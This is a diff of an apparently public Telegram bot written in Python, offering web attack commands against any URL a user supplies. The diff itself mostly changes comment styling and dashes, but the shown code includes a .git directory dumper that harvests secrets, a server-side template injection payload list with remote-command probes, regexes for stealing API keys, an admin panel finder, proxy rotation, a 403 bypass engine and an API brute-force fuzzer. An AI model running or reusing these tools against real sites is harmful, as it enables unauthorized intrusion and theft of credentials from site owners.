@@ -17442,16 +17692,16 @@ async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=update.effective_chat.id,
             document=result["zip_buffer"],
             filename=f"sourcemap_{domain}_{ts}.zip",
-            caption=f"🗺️ Source Map Extract   `{domain}`\n"
+            caption=f"🗺️ Source Map Extract — `{domain}`\n"
                     f"{result['total_source_files']} source files from {len(maps)} map(s)",
             parse_mode='Markdown'
         )
         _active_scans.pop(uid, None)
 
 
-# ======================================================================
-# 🔓 FEATURE #36   /gitexposed  Git Directory Exposure Finder
-# ======================================================================
+# ══════════════════════════════════════════════════════════════════════
+# 🔓 FEATURE #36 — /gitexposed  Git Directory Exposure Finder
+# ══════════════════════════════════════════════════════════════════════
 
 _GIT_PATHS = [
     "/.git/HEAD",
@@ -17495,7 +17745,7 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
     parsed = urlparse(url)
     base   = f"{parsed.scheme}://{parsed.netloc}"
 
-    # -- Step 1: Check .git exposure ---------------
+    # ── Step 1: Check .git exposure ───────────────
     progress_q.append("🔓 Checking .git directory exposure...")
     for path in _GIT_PATHS:
         try:
@@ -17523,7 +17773,7 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Step 2: SVN check -------------------------
+    # ── Step 2: SVN check ─────────────────────────
     progress_q.append("🔓 Checking SVN exposure...")
     for path in _SVN_PATHS:
         try:
@@ -17536,7 +17786,7 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Step 3: Mercurial check -------------------
+    # ── Step 3: Mercurial check ───────────────────
     progress_q.append("🔓 Checking Mercurial (.hg) exposure...")
     for path in _HG_PATHS:
         try:
@@ -17553,7 +17803,7 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
         progress_q.append("✅ No VCS exposure found")
         return results
 
-    # -- Step 4: Dump accessible git objects -------
+    # ── Step 4: Dump accessible git objects ───────
     progress_q.append("🔓 Dumping accessible git files...")
 
     import zipfile as _zf, io as _io
@@ -17586,7 +17836,7 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Step 5: Scan config for secrets -----------
+    # ── Step 5: Scan config for secrets ───────────
     progress_q.append("🔓 Scanning git files for secrets...")
     for file_info in results["accessible_files"]:
         content = file_info.get("content", "")
@@ -17601,12 +17851,12 @@ def _gitexposed_sync(url: str, progress_q: list) -> dict:
                 pass
 
     results["zip_buffer"] = zip_buf
-    progress_q.append(f"🔓 Done   {len(results['accessible_files'])} files dumped")
+    progress_q.append(f"🔓 Done — {len(results['accessible_files'])} files dumped")
     return results
 
 
 async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/gitexposed <url> - Check for exposed .git / .svn / .hg directories"""
+    """/gitexposed <url> — Check for exposed .git / .svn / .hg directories"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -17638,10 +17888,10 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
@@ -17649,7 +17899,7 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).hostname
     msg = await update.effective_message.reply_text(
-        f"🔓 *Git Exposure   `{domain}`*\n\n⏳ Checking VCS exposure...",
+        f"🔓 *Git Exposure — `{domain}`*\n\n⏳ Checking VCS exposure...",
         parse_mode='Markdown'
     )
     progress_q = []
@@ -17661,7 +17911,7 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(progress_q) > last:
                 try:
                     await msg.edit_text(
-                        f"🔓 *Git Exposure   `{domain}`*\n\n{progress_q[-1]}",
+                        f"🔓 *Git Exposure — `{domain}`*\n\n{progress_q[-1]}",
                         parse_mode='Markdown'
                     )
                 except Exception:
@@ -17675,7 +17925,7 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
         task.cancel()
         _active_scans.pop(uid, None)
 
-    lines = [f"🔓 *Git Exposure Scan   `{domain}`*", "--------------------"]
+    lines = [f"🔓 *Git Exposure Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
 
     any_exposed = result["git_exposed"] or result["svn_exposed"] or result["hg_exposed"]
 
@@ -17729,23 +17979,23 @@ async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
             chat_id=update.effective_chat.id,
             document=result["zip_buffer"],
             filename=f"gitdump_{domain}_{ts}.zip",
-            caption=f"🔓 Git Dump   `{domain}`\n"
+            caption=f"🔓 Git Dump — `{domain}`\n"
                     f"{len(result['accessible_files'])} files extracted",
             parse_mode='Markdown'
         )
         _active_scans.pop(uid, None)
 
 
-# +==============================================================+
-# |   NEW SCANNERS v28.1   SSTI / CORS / Open Redirect / LFI   |
-# +==============================================================+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║   NEW SCANNERS v28.1 — SSTI / CORS / Open Redirect / LFI   ║
+# ╚══════════════════════════════════════════════════════════════╝
 
-# ==================================================
-# 🔥 /ssti   Server-Side Template Injection Scanner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔥 /ssti — Server-Side Template Injection Scanner
+# ══════════════════════════════════════════════════
 
 _SSTI_PAYLOADS = [
-    # -- Math detection probes (engine fingerprinting) -----------------
+    # ── Math detection probes (engine fingerprinting) ─────────────────
     ("{{7*7}}",                  "49",        "Jinja2/Twig"),
     ("${7*7}",                   "49",        "FreeMarker/Velocity/Groovy"),
     ("#{7*7}",                   "49",        "Ruby ERB/Thymeleaf"),
@@ -17761,12 +18011,12 @@ _SSTI_PAYLOADS = [
     ("[[7*7]]",                  "49",        "Tornado/Mako"),
     ("{{=7*7}}",                 "49",        "Slim/Plim"),
     ("${T(java.lang.Runtime).getRuntime().exec('id')}", "java.lang", "Spring SPEL (Java)"),
-    # -- Config/secret leaks -------------------------------------------
+    # ── Config/secret leaks ───────────────────────────────────────────
     ("{{config}}",               "secret_key",          "Flask/Jinja2 config leak"),
     ("{{settings.SECRET_KEY}}",  "SECRET_KEY",          "Django settings leak"),
     ("{{self.__dict__}}",        "_TemplateReference",  "Jinja2 object dump"),
     ("{{app.secret_key}}",       "secret",              "Flask secret"),
-    # -- Framework-specific detection ---------------------------------
+    # ── Framework-specific detection ─────────────────────────────────
     ("{{request.application.__globals__['os'].popen('echo SSTI_TEST').read()}}", "SSTI_TEST", "Jinja2 RCE verify"),
     ("{{'7'*7}}",                "7777777",   "Twig PHP"),
     ("{{dump(app)}}",            "Twig",      "Twig dump()"),
@@ -17802,7 +18052,7 @@ _SECRET_REGEX_MAP = {
     "JWT Token":             (r'eyJ[A-Za-z0-9\-_=]+\.eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_.+/=]*', "MEDIUM"),
     "Private Key":           (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "CRITICAL"),
     "Generic API Key":       (r'(?i)(?:api[_\-]?key|apikey|api[_\-]?secret)[\s]*[=:][\s]*[\x27"]?([A-Za-z0-9\-_]{20,})', "MEDIUM"),
-    "Generic Secret":        (r'(?i)(?:secret|password|passwd|pwd)[\s]*[=:][\s]*[\x27"]([^\x27",\s]{8,})', "MEDIUM"),
+    "Generic Secret":        (r'(?i)(?:secret|password|passwd|pwd)[\s]*[=:][\s]*[\x27"]([^\x27",\\s]{8,})', "MEDIUM"),
     "Bearer Token":          (r'(?i)bearer\s+([A-Za-z0-9\-_=.+/]{20,})', "MEDIUM"),
     "Firebase URL":          (r'https://[a-z0-9\-]+\.firebaseio\.com', "MEDIUM"),
     "Heroku API Key":        (r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', "MEDIUM"),
@@ -17811,7 +18061,7 @@ _SECRET_REGEX_MAP = {
     "OpenAI API Key":        (r'sk-[A-Za-z0-9]{48}', "CRITICAL"),
     "Anthropic API Key":     (r'sk-ant-[A-Za-z0-9\-_]{95}', "CRITICAL"),
     "Cloudflare API Key":    (r'(?i)cloudflare.{0,20}[=:][\s]*[\x27"]?([a-zA-Z0-9_\-]{37})', "HIGH"),
-    "Database URL":          (r'(?i)(?:mysql|postgres|mongodb|redis|sqlite)://[^\s\x27"<>]{10,}', "HIGH"),
+    "Database URL":          (r'(?i)(?:mysql|postgres|mongodb|redis|sqlite)://[^\\s\x27"<>]{10,}', "HIGH"),
 }
 
 def _secretscan_sync(url: str, progress_q: list) -> dict:
@@ -17849,14 +18099,14 @@ def _secretscan_sync(url: str, progress_q: list) -> dict:
             except re.error:
                 pass
 
-    # -- Step 1: Scan main page HTML ---------------
+    # ── Step 1: Scan main page HTML ───────────────
     progress_q.append("🔍 Scanning main page HTML...")
     try:
         resp = session.get(url, timeout=12)
         results["pages_scanned"] += 1
         _scan_text(resp.text, "HTML")
 
-        # -- Step 2: Find JS files -----------------
+        # ── Step 2: Find JS files ─────────────────
         soup = BeautifulSoup(resp.text, _BS_PARSER)
         js_urls = set()
         for tag in soup.find_all('script', src=True):
@@ -17869,9 +18119,9 @@ def _secretscan_sync(url: str, progress_q: list) -> dict:
                 _scan_text(tag.string, "inline-script")
 
         results["js_files"] = list(js_urls)[:20]
-        progress_q.append(f"🔍 Found {len(js_urls)} JS files   scanning...")
+        progress_q.append(f"🔍 Found {len(js_urls)} JS files — scanning...")
 
-        # -- Step 3: Scan each JS file -------------
+        # ── Step 3: Scan each JS file ─────────────
         def _fetch_and_scan(js_url):
             try:
                 r = session.get(js_url, timeout=10)
@@ -17884,7 +18134,7 @@ def _secretscan_sync(url: str, progress_q: list) -> dict:
             list(ex.map(_fetch_and_scan, results["js_files"]))
             progress_q.append(f"🔍 Scanned {len(results['js_files'])} JS files")
 
-        # -- Step 4: Check common sensitive files --
+        # ── Step 4: Check common sensitive files ──
         sensitive_paths = [
             "/.env", "/.env.local", "/.env.production", "/.env.backup",
             "/config.js", "/config.json", "/app.config.js",
@@ -17911,7 +18161,7 @@ def _secretscan_sync(url: str, progress_q: list) -> dict:
 
 
 async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/secretscan <url> - Scan JS files & source for API keys, tokens, secrets"""
+    """/secretscan <url> — Scan JS files & source for API keys, tokens, secrets"""
     global db_lock, scan_semaphore
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
@@ -17946,13 +18196,13 @@ async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ", parse_mode='Markdown')
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Secret Scan")
 
     domain = urlparse(url).hostname
     msg = await update.effective_message.reply_text(
-        f"🔑 *Secret Scanner   `{domain}`*\n\n⏳ JS files + source scanning...",
+        f"🔑 *Secret Scanner — `{domain}`*\n\n⏳ JS files + source scanning...",
         parse_mode='Markdown')
 
     async with db_lock:
@@ -17969,14 +18219,14 @@ async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 txt = progress_q[-1]; progress_q.clear()
                 try:
                     await msg.edit_text(
-                        f"🔑 *Secret Scanner   `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                        f"🔑 *Secret Scanner — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                 except Exception: pass
 
     prog = asyncio.create_task(_prog())
-    # -- Queue notification: show message if scan is already running --
+    # ── Queue notification: show message if scan is already running ──
     if scan_semaphore._value == 0:
         await update.effective_message.reply_text(
-            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည်   ပြီးမှ အလိုအလျောက် စမည်\n"
+            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
             "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
             parse_mode='Markdown'
         )
@@ -17998,8 +18248,8 @@ async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
                       "✅ Clean")
 
     lines = [
-        f"🔑 *Secret Scanner   `{domain}`*",
-        "--------------------",
+        f"🔑 *Secret Scanner — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"Result: {severity_label}",
         f"JS files scanned: `{len(data['js_files'])}`",
         f"Total secrets found: `{total}`",
@@ -18033,18 +18283,18 @@ async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id=update.effective_chat.id,
         document=_io.BytesIO(rj.encode()),
         filename=f"secrets_{_safe_dom}_{ts}.json",
-        caption=f"🔑 Secret Scan   `{domain}` | Found: `{total}`",
+        caption=f"🔑 Secret Scan — `{domain}` | Found: `{total}`",
         parse_mode='Markdown'
     )
 
 
-# ==================================================
-# 🚀 /api   Admin Panel Finder (v41 NEW)
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🚀 /api — Admin Panel Finder (v41 NEW)
+# ══════════════════════════════════════════════════
 
 async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    /api <url>   v46 Ultra Admin & API Finder
+    /api <url> — v46 Ultra Admin & API Finder
     - Scans for admin panels, login pages, hidden dashboards, and API endpoints
     - Multi-threaded deep scanning (32 parallel workers)
     """
@@ -18082,14 +18332,14 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ", parse_mode='Markdown')
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
         return
     _active_scans.set(uid, "Admin Finder")
 
     domain = urlparse(url).hostname
     base_url = f"{urlparse(url).scheme}://{domain}"
     msg = await update.effective_message.reply_text(
-        f"🚀 *Admin Finder   `{domain}`*\n\n⏳ Scanning `{len(_ADMIN_PATHS)}` paths...",
+        f"🚀 *Admin Finder — `{domain}`*\n\n⏳ Scanning `{len(_ADMIN_PATHS)}` paths...",
         parse_mode='Markdown')
 
     results = []
@@ -18135,7 +18385,7 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
             perc = (progress_idx[0] / total) * 100
             try:
                 await msg.edit_text(
-                    f"🚀 *Admin Finder   `{domain}`*\n\n"
+                    f"🚀 *Admin Finder — `{domain}`*\n\n"
                     f"⏳ Progress: `{perc:.1f}%` ({progress_idx[0]}/{total})\n"
                     f"✅ Found: `{len(results)}`",
                     parse_mode='Markdown'
@@ -18162,12 +18412,12 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _active_scans.pop(uid, None)
 
     if not results:
-        await msg.edit_text(f"🚀 *Admin Finder   `{domain}`*\n\n❌ Admin panel တစ်ခုမှ မတွေ့ပါ", parse_mode='Markdown')
+        await msg.edit_text(f"🚀 *Admin Finder — `{domain}`*\n\n❌ Admin panel တစ်ခုမှ မတွေ့ပါ", parse_mode='Markdown')
         return
 
     lines = [
-        f"🚀 *Admin Finder   `{domain}`*\n",
-        "--------------------",
+        f"🚀 *Admin Finder — `{domain}`*\n",
+        "━━━━━━━━━━━━━━━━━━━━",
         "| Status | URL |",
         "| :--- | :--- |"
     ]
@@ -18187,15 +18437,15 @@ async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text(final_text, parse_mode='Markdown', disable_web_page_preview=True)
 
 
-# ==================================================
-# 🔒 /ssltls   SSL/TLS Configuration Scanner
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔒 /ssltls — SSL/TLS Configuration Scanner
+# ══════════════════════════════════════════════════
 
 # v44.1 optimized proxy constants
-_PROXY_CACHE_TTL    = 3600          # 1 hour   re-test stale proxies after this
+_PROXY_CACHE_TTL    = 3600          # 1 hour — re-test stale proxies after this
 _PROXY_MAX_FAILURES = 5             # evict proxy after 5 consecutive failures
-_PROXY_TEST_TIMEOUT = 4             # ⚡ 4s (was 8s)   dead proxies fail faster
-_PROXY_BATCH_SIZE   = 80            # ⚡ 80 concurrent (was 20)   4x faster batching
+_PROXY_TEST_TIMEOUT = 4             # ⚡ 4s (was 8s) — dead proxies fail faster
+_PROXY_BATCH_SIZE   = 80            # ⚡ 80 concurrent (was 20) — 4x faster batching
 _PROXY_MAX_CANDIDATES = 400         # ⚡ cap to avoid testing 2000+ proxies
 _PROXY_TEST_URLS    = [
     'http://httpbin.org/ip',        # Single fast test URL
@@ -18280,13 +18530,13 @@ class ProxyEntry:
         return {'http': self.url, 'https': self.url}
 
     def aiohttp_connector(self):
-        """Return aiohttp ProxyConnector - requires aiohttp-socks for SOCKS"""
+        """Return aiohttp ProxyConnector — requires aiohttp-socks for SOCKS"""
         return self.url
 
 
 class ProxyManager:
     """
-    v2   Enterprise proxy management with async validation,
+    v2 — Enterprise proxy management with async validation,
     smart scoring, auto-eviction, and manual management.
     """
 
@@ -18297,7 +18547,7 @@ class ProxyManager:
         self._fetching = False
         self._load_cache()
 
-    # --- Cache ---------------------------------------
+    # ─── Cache ───────────────────────────────────────
     def _load_cache(self):
         try:
             if os.path.exists(self._cache_file):
@@ -18321,7 +18571,7 @@ class ProxyManager:
         except Exception as e:
             logger.warning(f"Proxy cache save failed: {e}")
 
-    # --- Fetch ---------------------------------------
+    # ─── Fetch ───────────────────────────────────────
     async def fetch_proxy_lists(self, sources: List[str] = None) -> int:
         """
         Async-fetch proxies from all sources, validate in batches.
@@ -18430,7 +18680,7 @@ class ProxyManager:
         return proxies
 
     async def _test_proxy(self, proxy_url: str) -> Optional['ProxyEntry']:
-        """⚡ v44.1: Pure async aiohttp test - no threadpool blocking."""
+        """⚡ v44.1: Pure async aiohttp test — no threadpool blocking."""
         proto = 'http'
         if proxy_url.startswith('socks5'):
             proto = 'socks5'
@@ -18458,7 +18708,7 @@ class ProxyManager:
             pass
         return None
 
-    # --- Eviction & Sorting --------------------------
+    # ─── Eviction & Sorting ──────────────────────────
     def _sort_entries(self):
         self._entries.sort(key=lambda e: e.score)
 
@@ -18470,7 +18720,7 @@ class ProxyManager:
             if evicted:
                 logger.info(f"🗑️  Evicted {evicted} dead proxies")
 
-    # --- Get Proxy -----------------------------------
+    # ─── Get Proxy ───────────────────────────────────
     async def get_proxy(self, strategy: str = 'round-robin') -> Optional[ProxyEntry]:
         """
         Get proxy based on strategy:
@@ -18583,17 +18833,17 @@ class ProxyManager:
         return entry.proxy_url_for_requests(), entry
 
 
-# -- Initialize global proxy manager --
+# ── Initialize global proxy manager ──
 _PROXY_MANAGER = ProxyManager()
 
 
-# ==================================================
-# /proxy_download   Smart proxy download command
-# ==================================================
+# ══════════════════════════════════════════════════
+# /proxy_download — Smart proxy download command
+# ══════════════════════════════════════════════════
 
 async def cmd_proxy_download(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    /proxy_download [url]   Download through proxy chain (v2)
+    /proxy_download [url] — Download through proxy chain (v2)
 
     Features:
       ✅ HTTP / SOCKS4 / SOCKS5 rotation
@@ -18613,9 +18863,9 @@ async def cmd_proxy_download(update: Update, context: ContextTypes.DEFAULT_TYPE)
             "  ✅ Live download progress & speed\n"
             "  ✅ Auto-fallback to direct\n\n"
             "Related commands:\n"
-            "  `/proxy_status`    Pool health & top proxies\n"
-            "  `/proxy_add <ip:port> [type]`    Add manual proxy\n"
-            "  `/proxy_refresh`    Force re-validate pool",
+            "  `/proxy_status`  — Pool health & top proxies\n"
+            "  `/proxy_add <ip:port> [type]`  — Add manual proxy\n"
+            "  `/proxy_refresh`  — Force re-validate pool",
             parse_mode='Markdown'
         )
         return
@@ -18827,12 +19077,12 @@ async def _download_with_proxy_rotation_v2(
     return None, stats
 
 
-# ==================================================
-# /proxy_status   Pool health dashboard
-# ==================================================
+# ══════════════════════════════════════════════════
+# /proxy_status — Pool health dashboard
+# ══════════════════════════════════════════════════
 
 async def cmd_proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/proxy_status - Detailed proxy pool health & top proxies"""
+    """/proxy_status — Detailed proxy pool health & top proxies"""
     count = _PROXY_MANAGER.proxy_count()
     stale = _PROXY_MANAGER.stale_count()
     top   = _PROXY_MANAGER.top_proxies(5)
@@ -18848,7 +19098,7 @@ async def cmd_proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     lines = [
         "🔄 *Proxy Pool Status v2*",
-        "-----------------------",
+        "━━━━━━━━━━━━━━━━━━━━━━━",
         f"📊 Total:   `{count}` proxies",
         f"⏰ Stale:   `{stale}` (need re-validate)",
         f"✅ Fresh:   `{count - stale}`",
@@ -18861,14 +19111,14 @@ async def cmd_proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         sr = f"{e.success*100//total_calls}%" if total_calls > 0 else "new"
         lines.append(
             f"  {i}. {proto_emoji}`{e.url.split('://')[-1][:22]}` "
-            f"  `{e.speed_ms:.0f}ms` | SR:`{sr}`"
+            f"— `{e.speed_ms:.0f}ms` | SR:`{sr}`"
         )
 
     lines += [
         "",
         "_Commands:_",
-        "`/proxy_refresh`   Force re-fetch & validate",
-        "`/proxy_add <ip:port> [socks5]`   Add manual proxy",
+        "`/proxy_refresh` — Force re-fetch & validate",
+        "`/proxy_add <ip:port> [socks5]` — Add manual proxy",
     ]
 
     await update.effective_message.reply_text(
@@ -18877,12 +19127,12 @@ async def cmd_proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ==================================================
-# /proxy_refresh   Force re-validate entire pool
-# ==================================================
+# ══════════════════════════════════════════════════
+# /proxy_refresh — Force re-validate entire pool
+# ══════════════════════════════════════════════════
 
 async def cmd_proxy_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/proxy_refresh - Force re-fetch and validate all proxy sources"""
+    """/proxy_refresh — Force re-fetch and validate all proxy sources"""
     msg = await update.effective_message.reply_text(
         "🔄 *Proxy Refresh Started* _(v44.1 Fast Mode)_\n\n"
         "⏳ Fetching from 29+ sources in parallel...\n"
@@ -18899,7 +19149,7 @@ async def cmd_proxy_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         result_lines = [
             "✅ *Proxy Refresh Complete*",
-            "-----------------------",
+            "━━━━━━━━━━━━━━━━━━━━━━━",
             f"🆕 New validated: `{count}`",
             f"📊 Pool total:    `{total}`",
             f"⏱️ Time taken:    `{elapsed:.1f}s`",
@@ -18907,7 +19157,7 @@ async def cmd_proxy_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚡ Top 3 fastest:",
         ]
         for i, e in enumerate(top, 1):
-            result_lines.append(f"  {i}. `{e.url.split('://')[-1][:28]}`   `{e.speed_ms:.0f}ms`")
+            result_lines.append(f"  {i}. `{e.url.split('://')[-1][:28]}` — `{e.speed_ms:.0f}ms`")
 
         await msg.edit_text("\n".join(result_lines), parse_mode='Markdown')
 
@@ -18915,13 +19165,13 @@ async def cmd_proxy_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ Refresh error: `{str(e)[:100]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# /proxy_add   Manually add a proxy
-# ==================================================
+# ══════════════════════════════════════════════════
+# /proxy_add — Manually add a proxy
+# ══════════════════════════════════════════════════
 
 async def cmd_proxy_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    /proxy_add <ip:port> [type]   Manually add and validate a proxy
+    /proxy_add <ip:port> [type] — Manually add and validate a proxy
 
     Usage:
       /proxy_add 1.2.3.4:8080
@@ -18977,18 +19227,18 @@ async def cmd_proxy_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# ==================================================
-# 📊  /botstats   Real-time performance dashboard
+# ══════════════════════════════════════════════════
+# 📊  /botstats — Real-time performance dashboard
 #     Admin-only: thread pool, caches, circuit breaker,
 #     queue depth, rate limiters, memory usage
-# ==================================================
+# ══════════════════════════════════════════════════
 
 @admin_only
 async def cmd_botstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/botstats - Real-time bot performance metrics (admin only)"""
+    """/botstats — Real-time bot performance metrics (admin only)"""
     import tracemalloc, gc
 
-    # -- Thread Pool stats -------------------------
+    # ── Thread Pool stats ─────────────────────────
     executor = get_executor()
     try:
         pool_workers     = executor._max_workers
@@ -18997,27 +19247,27 @@ async def cmd_botstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         pool_workers = pool_threads = queue_backlog = 0
 
-    # -- Queue stats -------------------------------
+    # ── Queue stats ───────────────────────────────
     dl_queue_depth   = _dl_queue.qsize() if _dl_queue else 0
     active_users     = len(_active_scans)
     user_queue_total = sum(user_queue_count.values())
 
-    # -- Cache stats -------------------------------
+    # ── Cache stats ───────────────────────────────
     with _SCAN_CACHE_LOCK:
         scan_cache_size = len(_SCAN_CACHE)
     profile_cache_size = len(_PROFILE_CACHE)
     session_pool_size  = len(_SESSION_POOL)
 
-    # -- Circuit Breaker stats ---------------------
+    # ── Circuit Breaker stats ─────────────────────
     cb_stats   = _CIRCUIT_BREAKER.get_stats()
     cb_open    = sum(1 for s in cb_stats.values() if s['state'] == 'OPEN')
     cb_total   = len(cb_stats)
 
-    # -- Rate limiter stats ------------------------
+    # ── Rate limiter stats ────────────────────────
     light_rl_users = len(_light_rl)
     heavy_rl_users = len(_heavy_rl)
 
-    # -- Memory (optional) -------------------------
+    # ── Memory (optional) ─────────────────────────
     try:
         import psutil, os as _os
         proc = psutil.Process(_os.getpid())
@@ -19026,12 +19276,12 @@ async def cmd_botstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         mem_str = "_psutil not installed_"
 
-    # -- GC stats ----------------------------------
+    # ── GC stats ──────────────────────────────────
     gc_counts = gc.get_count()
 
     lines = [
         "📊 *Bot Performance Dashboard*",
-        "--------------------",
+        "━━━━━━━━━━━━━━━━━━━━",
         "",
         "🧵 *Thread Pool*",
         f"  Workers: `{pool_threads}/{pool_workers}` active | Backlog: `{queue_backlog}`",
@@ -19067,17 +19317,17 @@ async def cmd_botstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ==================================================================
-# 🚀 v43 NEW FEATURES   15 Fully Functional Commands
-# ==================================================================
+# ══════════════════════════════════════════════════════════════════
+# 🚀 v43 NEW FEATURES — 15 Fully Functional Commands
+# ══════════════════════════════════════════════════════════════════
 # Paste this entire block BEFORE `if __name__ == '__main__': main()`
 # at the bottom of bot_merged_v42.py
-# ==================================================================
+# ══════════════════════════════════════════════════════════════════
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🛡️  v43 ENHANCED 403 BYPASS ENGINE
-# ==================================================
+# ══════════════════════════════════════════════════
 
 _403_BYPASS_TECHNIQUES = [
     # (header_dict, description)
@@ -19150,9 +19400,9 @@ async def _bypass_403_async(session: aiohttp.ClientSession, url: str, timeout: i
     return False, 403, '', 'All bypass techniques failed'
 
 
-# ==================================================
-# 1️⃣  /tech_stack   Full Technology Stack Detection
-# ==================================================
+# ══════════════════════════════════════════════════
+# 1️⃣  /tech_stack — Full Technology Stack Detection
+# ══════════════════════════════════════════════════
 
 # Extended technology fingerprints
 _TECH_FINGERPRINTS = {
@@ -19209,7 +19459,7 @@ _TECH_FINGERPRINTS = {
 }
 
 async def cmd_tech_stack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/tech_stack <url> - Deep Website Technology Stack Analysis"""
+    """/tech_stack <url> — Deep Website Technology Stack Analysis"""
     if not context.args:
         await update.effective_message.reply_text(
             "📌 *Usage:* `/tech_stack https://example.com`\n\n"
@@ -19223,7 +19473,7 @@ async def cmd_tech_stack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         url = 'https://' + url
     domain = urlparse(url).netloc
     msg = await update.effective_message.reply_text(
-        f"⣾ *Analyzing Tech Stack   `{domain}`*\n\n"
+        f"⣾ *Analyzing Tech Stack — `{domain}`*\n\n"
         f"🔍 Fingerprinting `{len(_TECH_FINGERPRINTS)}` technologies...",
         parse_mode='Markdown')
 
@@ -19274,7 +19524,7 @@ async def cmd_tech_stack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Build report
         lines = [
             f"🛠 *Tech Stack Report: `{domain}`*",
-            f"--------------------",
+            f"━━━━━━━━━━━━━━━━━━━━",
             f"🌐 Status: `{status}` | Server: `{hdrs.get('server', 'Unknown')}`",
             "",
         ]
@@ -19312,9 +19562,9 @@ async def cmd_tech_stack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ *Tech Stack Analysis Failed*\n\n`{str(e)[:200]}`", parse_mode='Markdown')
 
 
-# ==================================================
-# 2️⃣  /api_fuzzer   Advanced API Brute-force + 403 Bypass
-# ==================================================
+# ══════════════════════════════════════════════════
+# 2️⃣  /api_fuzzer — Advanced API Brute-force + 403 Bypass
+# ══════════════════════════════════════════════════
 
 _FUZZER_PATHS = [
